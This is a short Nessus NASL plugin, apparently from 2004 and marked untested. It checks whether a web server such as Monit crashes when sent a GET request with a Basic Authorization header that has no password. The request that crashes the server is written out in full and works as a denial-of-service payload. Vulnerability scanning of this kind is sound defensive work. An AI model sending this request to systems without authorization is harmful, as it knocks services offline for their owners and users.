#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# References:

# Affected:
# Monit
# 


if(description)
{
 script_id(12200);
 script_version ("$Revision: 1.3 $");
 name["english"] = "Incomplete basic authentication DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with an incomplete Basic authentication.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Basic authentication without password chokes the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

####

include ("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

req = 'GET / HTTP/1.1\r\nHost: ' + get_host_name() + '\r\n' +
'Authorization: Basic WFhYWFg6\r\n\r\n';

send(socket: soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);

 
